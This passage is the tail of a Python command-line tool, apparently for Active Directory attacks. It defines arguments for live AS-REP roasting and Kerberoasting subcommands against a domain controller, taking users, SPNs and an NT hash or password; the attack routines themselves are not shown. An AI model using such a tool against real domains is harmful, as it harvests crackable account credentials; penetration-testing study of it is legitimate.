    pa = sub.add_parser("asrep",
                        help="live AS-REP roast (no credentials needed)")
    pa.add_argument("--dc", required=True, metavar="HOST",
                    help="domain controller hostname")
    pa.add_argument("--realm", help="Kerberos realm (default: from --dc)")
    pa.add_argument("--port", type=int, default=88)
    pa.add_argument("--udp", action="store_true",
                    help="send over UDP instead of TCP")
    pa.add_argument("--timeout", type=float, default=3.0)
    pa.add_argument("--user", action="append", metavar="NAME",
                    help="user to test (repeatable)")
    pa.add_argument("--users", metavar="FILE",
                    help="file with one user per line")
    pa.add_argument("--etypes", default="23",
                    help="etypes to request, comma separated (default: 23)")
    pa.add_argument("--json", action="store_true", help="machine-readable output")
    pa.set_defaults(func=run_asrep)

    pr = sub.add_parser("roast",
                        help="live Kerberoast (needs one low-privilege account)")
    pr.add_argument("--dc", required=True, metavar="HOST")
    pr.add_argument("--realm", help="Kerberos realm (default: from --dc)")
    pr.add_argument("--port", type=int, default=88)
    pr.add_argument("--udp", action="store_true")
    pr.add_argument("--timeout", type=float, default=3.0)
    pr.add_argument("--user", required=True, metavar="NAME",
                    help="your low-privilege account (TGT holder)")
    pr.add_argument("--nthash", metavar="HEX", help="your account's NT hash")
    pr.add_argument("--password", help="your account's password (prefer --nthash)")
    pr.add_argument("--spn", action="append", metavar="SPN",
                    help="service principal to roast (repeatable)")
    pr.add_argument("--spns", metavar="FILE", help="file with one SPN per line")
    pr.add_argument("--json", action="store_true", help="machine-readable output")
    pr.set_defaults(func=run_roast)
    return p


def main(argv=None):
    opts = build_parser().parse_args(argv)
    try:
        return opts.func(opts)
    except RoastError as e:
        print("error: %s" % e, file=sys.stderr)
        return EXIT_ERROR
    except KeyboardInterrupt:
        return 130


if __name__ == "__main__":
    sys.exit(main())
